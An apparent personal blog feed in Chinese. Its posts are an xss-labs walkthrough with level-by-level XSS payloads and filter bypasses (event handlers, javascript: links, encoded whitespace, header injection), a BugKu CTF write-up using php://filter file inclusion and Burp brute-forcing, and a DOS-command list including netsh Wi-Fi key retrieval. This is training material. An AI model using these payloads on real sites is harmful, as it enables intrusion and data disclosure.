class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> 代码 </tag>
            
            <tag> 杭电OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs</title>
      <link href="/2020/02/12/xss-labs/"/>
      <url>/2020/02/12/xss-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="持续更新ing"><a href="#持续更新ing" class="headerlink" title="持续更新ing"></a>持续更新ing</h2><a id="more"></a><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p>&emsp;&emsp;第一关是搜索到的教程，因为啥都不明白。<br>&emsp;&emsp;然后就是没有搜索框，就直接使用get的方式传值，归根结底还是html。让<code>name=&quot;test&quot;</code>输入的内容代替到了的是test的那一处，输入<code>name=&quot;test&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>&emsp;&emsp;然后弹框<code>完成的不错</code></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p>&emsp;&emsp;第二关是半自己做的，在第一关中明白了一点思路。<br>&emsp;&emsp;因为存在搜索框，使用的payload就和level-1的一样，也就是<code>keyword=&quot;test&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code><br>&emsp;&emsp;那为什么要在这个最后加上<code>//</code>这个东西呢？就是因为这个可以把后面的<code>&quot;&gt;</code>这个东西给他注释掉。功能很强大的样子。<br>&emsp;&emsp;还是弹框<code>完成的不错</code></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>&emsp;&emsp;第三关也是半看相关知识半做的，得知这一关要使用的知识是JavaScript事件相关的。在菜鸟教程学习了相关的知识。<a href="https://www.runoob.com/js/js-events.html" target="_blank" rel="noopener">菜鸟教程-JavaScript事件</a></p><p>&emsp;&emsp;这一关对<code>&lt;``&gt;</code>这两个标签采用了转义处理，然后这个引号是单引号而非双引号，所以在框内搜索<code>1&#39; onclick=alert(1)//</code>就可以了<br>&emsp;&emsp;然后就是这个<code>//</code>的作用还是不太清楚，似乎是要注释掉后面的标签，不知道最后为啥就还可以执行这个事件反正是做出来了，还不错。</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p>&emsp;&emsp;自己做的也是稀里糊涂的，用法和上一关的用法一样，就是这次的单引号换成了双引号，我正准备再尝试一次呢，就弹出完成的不错了。<br>&emsp;&emsp;输入框中的内容<code>1&quot; onclick=alert(1)//</code><br>&emsp;&emsp;ps:看到try harder！还以为很难。</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p>&emsp;&emsp;使用<code>&quot;&gt; &lt;script&gt;alert(&#39;yes&#39;)&lt;/script&gt;</code>一般语句尝试，过滤了script标签<br>&emsp;&emsp;使用<code>find a way out!&quot; onclick=alert(1)//</code>过滤掉了onclick标签<br>&emsp;&emsp;以上两个标签的过滤，都是对大小写都进行了过滤。<br>&emsp;&emsp;看了别人写的博客，发现还能使用<code>&lt;a&gt;&lt;/a&gt;</code>，这个标签。<br>&emsp;&emsp;然后尝试使用伪链接方式假造一个超链接：<br>&emsp;&emsp;<code>&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;hahaha&lt;/a&gt;</code>，点击自己创建的链接，完成的不错。</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p>&emsp;&emsp;和第一关相似的payload，然后把<code>script</code>中的<code>s</code>改为大写的<code>S</code>,对小写的整体进行了过滤，但是未对大写的部分进行过滤<br>&emsp;&emsp;payload为<code>break it out!&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code><br>&emsp;&emsp;完成的不错。</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p>&emsp;&emsp;第七关因为很多关键的词语都被屏蔽了，但是<code>onclick</code>中的<code>on</code>被直接替换为空，所以可以采用<code>单词嵌套</code>来绕过屏蔽。<br>&emsp;&emsp;payload为:<code>1&quot; oonnclick=alert(1)//</code><br>&emsp;&emsp;完成的不错！</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p>&emsp;&emsp;这里有一个添加友情链接的功能，然后试一下用<code>javascript:alert(1)</code>然后就变成了<code>javas_cript:alert(1)</code>，又试了一下大小写，同样也被过滤掉了。<br>&emsp;&emsp;最后是使用了Unicode编码了一次，才能<code>绕过</code>过滤。<br>&emsp;&emsp;点击友情链接，完成的不错！</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p>&emsp;&emsp;这里还是有一个添加友情链接的功能，然后试一下用<code>javascript:alert(1)</code>然后就不合法，很多关键词都被过滤掉了。<br>&emsp;&emsp;后台的源码应该与下面的<code>代码</code>实现的<code>功能</code>类似:</p><figure class="highlight html"><figcaption><span>javascript</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line">&#123;     </span><br><span class="line"><span class="actionscript">confirm(<span class="string">"完成的不错！"</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">"level10.php?keyword=well done!"</span>; </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level9<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level9<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span></span><br><span class="line"><span class="php">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span></span><br><span class="line"><span class="php">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span></span><br><span class="line"><span class="php">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span></span><br><span class="line"><span class="php">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span></span><br><span class="line"><span class="php">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span></span><br><span class="line"><span class="php">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span></span><br><span class="line">echo '&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="php">&lt;/center&gt;<span class="string">';</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level9.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;发现要有<code>http://</code>这个关键词，就把他放在<code>//</code>的后面就行了。<br>&emsp;&emsp;因为对关键词进行了过滤，所以就算payload是<code>javascript:alert(1)//http://</code>也是不行的，可以<code>r</code>和<code>i</code>之间放入一个<code>%09</code>就是Tab制表符实现过滤。但是我并不知道具体的过滤的实现过程。</p><h4 id="09要放在url内实现。"><a href="#09要放在url内实现。" class="headerlink" title="%09要放在url内实现。"></a>%09要放在url内实现。</h4><p>&emsp;&emsp;点击链接，完成的不错</p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p>&emsp;&emsp;查看元素后发现，<code>page</code>里面有一些，准确来说是3个<code>隐藏</code>的<code>&lt;input&gt;</code>的标签<br>&emsp;&emsp;分别对这3个参数进行GET传参：<code>http://web-labs.rinue.top/xss-labs/level10.php?keyword=well%20done!&amp;t_link=test1&amp;t_history=test2&amp;t_sort=test3</code> ,查看元素的代码为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_link"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_history"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"t_sort"</span> <span class="attr">value</span>=<span class="string">"test3"</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由此可见，可对<code>t_sort</code>这个参数进行传值。<br>&emsp;&emsp;下一步就是弹框了，payload为<code>?t_sort=test&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code>其中<code>test&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code>为传入的内容<br>&emsp;&emsp;完成的不错！</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p>&emsp;&emsp;和level-10差不多，都是hiden的框框，但是模仿着10关的过程怎么都做不出来，看了别人做的。<br>&emsp;&emsp;原来是要修改<code>referer</code>，最后使用了 <code>HackBar2.1.3</code> (火狐的)然后构造payload直接就行了。<br>&emsp;&emsp;payload为<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code>,点击已经显示出来的框框就行了。<br>&emsp;&emsp;完成的不错！</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>&emsp;&emsp;和第11关的差不多，模仿着第11关，一做就出来了。<br>&emsp;&emsp;这一关修改的是<code>user-agent</code>,因为下面的<code>t_ua</code>的值就是<code>user-agent</code>的值。<br>&emsp;&emsp;<code>payload</code>不用改，还是11关的<code>payload</code>就行。<br>&emsp;&emsp;完成的不错！</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>&emsp;&emsp;和上两关的差不多，不过这一关所要修改的是cookies的值。<br>&emsp;&emsp;<code>payload</code>稍有不同，用的是前两关用到的<code>payload</code>之外，又多加了一部分。因为cookies的结构与其他的有些不一样。<br>&emsp;&emsp;payload为<code>user=&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code>,点击显示出来的框框。<br>&emsp;&emsp;完成的不错！</p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>&emsp;&emsp;不会，先跳过，会了再回来。<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p>&emsp;&emsp;根据writeup，这里的注入点为<code>src</code>，<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p>&emsp;&emsp;源码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line">&#123;     </span><br><span class="line"><span class="actionscript">confirm(<span class="string">"完成的不错！"</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">"level17.php?arg01=a&amp;arg02=b"</span>; </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level16<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level16<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span></span><br><span class="line"><span class="php">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);  /过滤<span class="string">'script'</span></span></span><br><span class="line"><span class="php">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2); <span class="comment">//过滤'空格'</span></span></span><br><span class="line"><span class="php">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);   <span class="comment">//过滤'/'</span></span></span><br><span class="line"><span class="php">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);  </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level16.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str5).<span class="string">"&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;过滤了<code>script</code>，<code>空格</code>，<code>/</code>。使用换行符<code>%0A</code>取代空格，在html中照样可以运行。<br>&emsp;&emsp;payload为:<code>&lt;img%0asrc=&quot;1.jpg&quot;%0aonerror=&quot;alert(1)&quot;&gt;</code>,这里的<code>1.jpg</code>是不存在的，所以触发了<code>onerror</code>事件，导致弹窗。<br>&emsp;&emsp;完成的不错！</p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p>&emsp;&emsp;<code>&lt;embed src=&quot;xsf01.swf?a=b&quot; heigth=&quot;100%&quot; width=&quot;100%&quot;&gt;</code>这一段是关键的代码。而url中<code>arg01=a&amp;arg02=b</code>说明<code>arg01</code>和<code>arg02</code>分别取代的是<code>a=b</code>中的前面(a)和后面(b)。<br>&emsp;&emsp;所以构造的payload为<code>arg01=a&amp;arg02=b onmouseover=alert(1)</code>，就行了，开始忙活了半天没有实现成功。原来是我的火狐浏览器的问题！<br>&emsp;&emsp;使用<code>Microsoft edge</code>的时候才能成功，因为<code>xsf01.swf</code>这个文件火狐里打不开，但是<code>Microsoft edge</code>打得开<br>&emsp;&emsp;完成得不错！</p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p>&emsp;&emsp;跟上一关相似，一开始空格被转化成了<code>%20</code>，然后把<code>%20</code>改成%0A就可以了,还是火狐不可以，但是<code>Microsoft edge</code>可以<br>&emsp;&emsp;payload为<code>arg01=a&amp;arg02=b%0Aonmouseover=alert(1)</code>。<br>&emsp;&emsp;完成的不错！进入下一关！</p><h3 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h3><p>&emsp;&emsp;最后两关还没想出对策。<br>&emsp;&emsp;似乎跟17，18差不多。<br>&emsp;&emsp;<br>&emsp;&emsp;</p><h3 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h3><p>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> html </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu</title>
      <link href="/2020/01/31/BugKu/"/>
      <url>/2020/01/31/BugKu/</url>
      
        <content type="html"><![CDATA[<h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><a id="more"></a><p>这是一道审计题，将他源码中给的URL编码的内容解码之后，得到了JavaScript的代码：如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">var a=document.getElementById("password"); #password就是输入框内的值</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>重要的内容应该就是:<code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code>这一句，我看得不是很懂。然后就输入那个引号中的内容，flag就给出来了。</p><h3 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h3><p>&ensp;用burpsuite劫一下包，然后send to repeater，然后send，flag就出现了。<br>就是这样了，上图<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/18/8wdgWn.png" alt="头等舱.png"></p><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>1.先用御剑扫一下目录。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/18/8B5dde.png" alt="御剑.png"></p><p>2.因为是网站被黑，所以进入shell.php，然后是passwd界面，用burp瞎跑出来了passwd：hack。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/18/8B55Js.png" alt="burp.png"></p><p>3.输入passwd，显示flag。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/18/8BIB0U.png" alt="flag.png"></p><h3 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h3><p>转自<a href="https://blog.csdn.net/zpy1998zpy/article/details/80585443" target="_blank" rel="noopener">大佬的博客</a></p><p>是个本地文件包含漏洞:<br>具体执行: <a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p><p>具体含义：php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示读取的目标文件为index.php。通过传递这个参数可以得到index.php的源码。<br>源码中有include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。<br>而include的内容是由用户控制的，所以通过我们传递的file参数，是include()函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。而如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。</p><p>看图<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/18/8BTAGd.png" alt="index.png"></p><h3 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h3><p>提示爆破，直接用burp suite爆破得密码：13579.<br>看图，用的是字典生成器。不太会用burp上面自带的密码(主要是我的英语不是很好)，看图。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/20/8gydeO.png" alt="baopo.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客改子域名的总结</title>
      <link href="/2020/01/24/github%E6%94%B9%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2020/01/24/github%E6%94%B9%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="最重要的-仅需简单的三步"><a href="#最重要的-仅需简单的三步" class="headerlink" title="最重要的-仅需简单的三步"></a>最重要的-仅需简单的三步</h1><h2 id="今天是2020-01-24"><a href="#今天是2020-01-24" class="headerlink" title="今天是2020-01-24"></a>今天是2020-01-24</h2><p>今天晚上闲来无事，感觉自己的博客的子域名太长了，不太方便记忆，所以我就改了一下我的GitHub的name顺道把博客的子域名也改了一下，下面就来总结一下，emmm我是在原来的博客的基础上做的更改，哦，让我们开始吧~</p><a id="more"></a><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>更改自己的GitHub的name：<br>点到自己的GitHub页面的右上角，在展开栏的setting哪里点开，在Profile的Public Profile的第一项就是我们所要修改的name<br>注意：会提示带有红色的警告，不要管他，直接改你的名字就好了。<br>改了你的名字之后不要忘记给你的界面刷新一下(当然，不刷新也不会出现问题，就是我有点强迫症)</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>在你的站点配置文件里改一下你的git的上传地址就好了，更改的内容形式如此:<code>https://github.com/a16n/a16n.github.io.git</code>。就改这一处就好了，然后你就可以发现你的子域名已经改过了，然后你访问一下https://<code>你改过的name</code>.github.io就好了呀！</p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>最重要的+1</p><h4 id="hexo-clean-amp-amp-hexo-g-d"><a href="#hexo-clean-amp-amp-hexo-g-d" class="headerlink" title="$ hexo clean &amp;&amp; hexo g -d"></a>$ hexo clean &amp;&amp; hexo g -d</h4><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一开始刚改过name的时候感觉挺害怕，因为那里有红色的提示，刷新404，怕改不回来了。后来我查了一下问题，然后进行了上述的改动，不就好起来了嘛！hhh</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>我的qq：2994016494，欢迎学习交流，指出我的错误。<br><a href="https://github.com/" target="_blank" rel="noopener">GitHub官网</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dos命令学习</title>
      <link href="/2020/01/19/dos%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/01/19/dos%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="一天一个有用的dos命令"><a href="#一天一个有用的dos命令" class="headerlink" title="一天一个有用的dos命令"></a>一天一个有用的dos命令</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.netsh wlan show profiles wi-fi名 key=clear</span><br><span class="line">dos命令查询所连过的wi-fi密码，更新前的，不一定是现在的。</span><br><span class="line"><span class="number">2</span>.<span class="built_in">cls</span>：清除屏幕，有用吧，太强了吧。(手动滑稽)</span><br><span class="line"><span class="number">3</span>.<span class="built_in">cd</span>:进入某个文件夹使用<span class="built_in">cd</span>。</span><br><span class="line"><span class="number">4</span>.<span class="built_in">DIR</span>:显示某个磁盘或某个文件夹里的所有文件，例如：<span class="built_in">DIR</span> D:</span><br><span class="line">      则会显示D磁盘里的所有文件。</span><br><span class="line"><span class="number">5</span>.<span class="built_in">FORMAT</span> 盘名(如:C或者D):(注意最后的冒号，一定要加上)：格式化某一个磁盘。</span><br></pre></td></tr></table></figure><p>6.color:用<code>color /?</code>查看颜色对应的选项，然后用color 对应的选项即可改变颜色！</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7.进入某个磁盘是直接d:或者c:就可以啦，不用cd</span><br><span class="line">8.notepad：新建并打开一个记事本文件，保存的路径可以在</span><br><span class="line">           